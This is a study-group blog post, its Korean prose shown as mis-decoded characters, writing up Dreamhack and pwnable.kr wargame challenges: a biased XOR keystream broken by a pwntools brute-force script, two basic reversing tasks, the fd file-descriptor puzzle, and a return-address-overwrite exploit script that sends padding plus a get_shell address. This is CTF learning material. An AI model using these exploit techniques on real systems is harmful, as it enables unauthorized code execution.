---
title: "[CAUTION] ìŠ¤í„°ë”” - 1"
categories:
  - study
tags:
  - dreamhack
  - pwnable
toc: true
toc_sticky: true
toc_label: "ìŠ¤í„°ë”” - 1"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/caution2.jpg
---

ğŸ’¡ Caution ìŠ¤í„°ë”” 1íšŒì°¨(5ì›” ì²«ì§¸ ì£¼)
{: .notice--warning}

# ì•”í˜¸í•™ - 1

**[CS448](https://dreamhack.io/wargame/challenges/452/)**
    
```python
def encrypt(s, k):
    res = ""
    if k <= len(s):
        _print("[!] key shold be larger then len(pt) for safty!!")
        return ""
    for i, c in enumerate(s):
        enc = (get_random_u8() + key * i) % 0xff
        enc = ord(c) ^ enc
        res += hex(enc)[2:].rjust(2, "0")
    return res
```

ìœ„ì˜ ì½”ë“œì™€ ê°™ì€ ë°©ì‹ìœ¼ë¡œ ì•”í˜¸í™”ë¥¼ ìˆ˜í–‰í•œë‹¤.

ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ë¶€ë¶„ì€ %0xff ì´ë‹¤.

```key stream : (get_random_u8() + key * i) % 0xff``` ë¶€ë¶„ì„ ì˜ ìƒê°í•´ ë³´ë©´ ê·¸ ê²°ê³¼ë¡œ 0~254 ê¹Œì§€ì˜ ê²°ê³¼ê°€ ë‚˜ì˜¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

ì´ê²ƒì´ ì™œ ë¬¸ì œì¸ì§€ ìƒê°í•´ë³´ì. ì„ì˜ì˜ í‰ë¬¸ 'X'ì— ëŒ€í•´ì„œ ì•”í˜¸í™”ë¥¼ í†µí•´ì„œ ë‚˜ì˜¬ ìˆ˜ ìˆëŠ” ëª¨ë“  ê²°ê³¼ëŠ” 8bit ê²°ê³¼ì´ë¯€ë¡œ 00000000 ~ 11111111 ë¡œ ì´ 256ê°œì´ë‹¤.

ê·¼ë° í˜„ì¬ í‚¤ ìŠ¤íŠ¸ë¦¼ì€ 0~254ê¹Œì§€ì˜ ë²”ìœ„ë¥¼ ê°€ì§€ë¯€ë¡œ 255ê°œì˜ í‚¤ ìŠ¤íŠ¸ë¦¼ì´ ìˆë‹¤.

ì¦‰, ì„ì˜ì˜ ë¬¸ì 'X'ì— ëŒ€í•´ì„œ ê³„ì† ì•”í˜¸í™”ë¥¼ ìˆ˜í–‰í•˜ë©´ 'X' xor '11111111' ì˜ ê²°ê³¼ê°€ ëˆ„ë½ë˜ê²Œ ëœë‹¤.

ê·¸ëŸ¬ë©´ ìš°ë¦¬ëŠ” í•˜ë‚˜ì˜ ê¸€ìì— ëŒ€í•´ì„œ ê³„ì† ì•”í˜¸í™”ë¥¼ ìˆ˜í–‰í•˜ë©´ì„œ ì–´ë– í•œ ê²°ê³¼ê°€ ë‚˜ì™”ëŠ”ì§€ë¥¼ ì „ë¶€ ê¸°ë¡í•œ ë’¤ì—, 0-255ì¤‘ì— í•œ ë²ˆë„ ì•ˆë‚˜ì˜¨ ê²°ê³¼ë¥¼ ì°¾ìœ¼ë©´ ëœë‹¤. ê·¸ëŸ¬ë©´ ê·¸ ìˆ«ìê°€ ë°”ë¡œ 
'X' xor '11111111'ì´ ë˜ëŠ” ê²ƒì´ë‹¤.

ì´ë¥¼ ì½”ë“œë¡œ êµ¬í˜„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤. ëª¨ë“  flag í•˜ë‚˜í•˜ë‚˜ì— ëŒ€í•´ì„œ bruteforceë¥¼ í•˜ë‹¤ë³´ë‹ˆ, ê²°ê³¼ê°€ ë‚˜ì˜¤ëŠ”ë° ì‹œê°„ì´ ê½¤ ê±¸ë¦°ë‹¤. 

```python
from pwn import *


p = remote('host1.dreamhack.games',10819)

key = 255

p.sendlineafter('>> ','3')
p.sendlineafter('key >> ','255')
p.recvuntil('result : ')

enc_flag = p.recvline()
flag_len = len(enc_flag) // 2
flag_set = [list(range(256)) for _ in range(flag_len)]
flag = [0 for x in range(flag_len)]

while True:
    p.sendlineafter('>> ','3')
    p.sendlineafter('key >> ','255')
    p.recvuntil('result : ')
    
    enc_flag = bytes.fromhex(p.recvline()[:-1].decode())

    for i in range(flag_len):
        # flag_setì—ì„œ ì°¾ëŠ” ê¸€ì í•˜ë‚˜ì”© ì‚­ì œ
        if flag_set[i].count(enc_flag[i]) == 1:
            flag_set[i].remove(enc_flag[i])
        
        # í•œê°œ ë‚¨ì€ ê²°ê³¼ì— 255 xor í•˜ë©´ ì›ë˜ ê¸€ì
        if len(flag_set[i]) == 1:
            flag[i] = chr(flag_set[i][-1] ^ key )

    print([len(x) for x in flag_set])    
    if 0 not in flag:
        break
            
print(''.join(flag))

```


![image](https://user-images.githubusercontent.com/33647663/167166094-8731c708-f5ae-4399-b1f7-a965f2af6329.png)


# ë¦¬ë²„ì‹± - 1
**[rev-basic-0](https://dreamhack.io/wargame/challenges/14/)**

ë¦¬ë²„ì‹± ê¸°ì´ˆë¬¸ì œ

IDAë¡œ ì—´ë©´ ë°”ë¡œ strcmpê°€ ë³´ì„

![image](https://user-images.githubusercontent.com/33647663/167167482-413fd717-1ab8-453a-84bd-3545fbd6307d.png)


# ë¦¬ë²„ì‹± - 2
**[rev-basic-2](https://dreamhack.io/wargame/challenges/16/)**

![image](https://user-images.githubusercontent.com/33647663/167168558-de394732-9760-4364-b18b-12707b202817.png)


ê°ê°ì˜ input(a1)ì— ëŒ€í•´ì„œ, aC[] ë°°ì—´ê³¼ ë¹„êµë¥¼ í•˜ê³  ìˆë‹¤.
ì´ ê¸¸ì´ëŠ” 18ê¸€ì ì´ë©°, aCë°°ì—´ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/167168899-099070a1-4fb3-4078-bc26-6c82a93ac5ae.png)

ë°ì´í„° íƒ€ì…ì„ arrayë¡œ ë°”ê¾¸ë©´ ë” ë³´ê¸° ì‰½ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/167169712-de730a70-d4b6-44e2-8287-d016aecbc849.png)

ë§ˆì§€ë§‰ nullë¬¸ìë¥¼ ì œì™¸í•˜ë©´ ì´ 17ê¸€ìë¡œ 
flagëŠ” 'Comp4re_the_arr4y'ì´ë‹¤.


# ì‹œìŠ¤í…œ - 1

**[pwnable.kr](https://pwnable.kr/play.php) [fd]**

ë¬¸ì œì˜ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```c
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

argv[1] - 0x1234 ê°’ì„ fdë¡œ í•˜ì—¬ í•´ë‹¹ fdë¡œ ë°ì´í„°ë¥¼ ì½ì–´ì˜¨ë‹¤.

stdin ì´ fd 0 ì´ë¯€ë¡œ argv[1]ë¡œ 0x1234ì¸ 4660 ë°ì´í„°ë¥¼ ë„˜ê²¨ì¤€ë‹¤.

ë„˜ê²¨ì£¼ë©´ ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ ê¸°ë‹¤ë¦¬ê²Œ ë˜ê³ , ì´ë•Œ ë¹„êµ ë¬¸ìì—´ì¸ 'LETMEIN'ì„ ì…ë ¥í•´ ì£¼ë©´ flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/167191157-e2c61f67-9c03-48e7-baca-1b795ae87d48.png)



# ì‹œìŠ¤í…œ - 2

**[Return Address Overwrite](https://dreamhack.io/wargame/challenges/351/)**
ë©”ì¸í•¨ìˆ˜ë¥¼ ì‹œì‘í• ë•Œ ìŠ¤íƒ ìƒíƒœëŠ” ì•„ë˜ì™€ ê°™ë‹¤


![image](https://user-images.githubusercontent.com/33647663/167182991-88bc7d37-2f97-4069-aae8-dffe211841a0.png)

ê·¸ë¦¼ìœ¼ë¡œ í‘œí˜„í•´ë³´ë©´ ìŠ¤íƒ ìƒíƒœëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤

![image](https://user-images.githubusercontent.com/33647663/167183968-75242f51-75c8-469a-b592-59392ff0ed25.png)

bufì— ì…ë ¥ ë°›ì„ë•Œ bof ì·¨ì•½ì ì´ ìˆìœ¼ë‹ˆ, 56byteëŠ” ë”ë¯¸ë¡œ ì±„ì›Œì£¼ê³  8 byteë¥¼ get_shell() í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì…ë ¥í•˜ì—¬ ìµìŠ¤í”Œë¡œì‡ í•œë‹¤.

get_shell()ì˜ ì£¼ì†ŒëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/167184372-2064a6d2-7f00-4bf1-b8d0-1ee0331d7bcf.png)

ì‰˜ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±í•´ ì¤€ë‹¤.

```python
from pwn import *

p = remote('host1.dreamhack.games',21598)
context.log_level= 0

# get_shell() : 0x00000000004006aa
p.recvuntil(b'Input: ')
payload = 'A' * 0x30
payload += 'B' * 8
payload += '\xaa\x06\x40\x00\x00\x00\x00\x00'

p.sendline(payload)
p.interactive()
```


ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/167182774-e216d7eb-0a9c-4465-b75f-5b9cc969751b.png)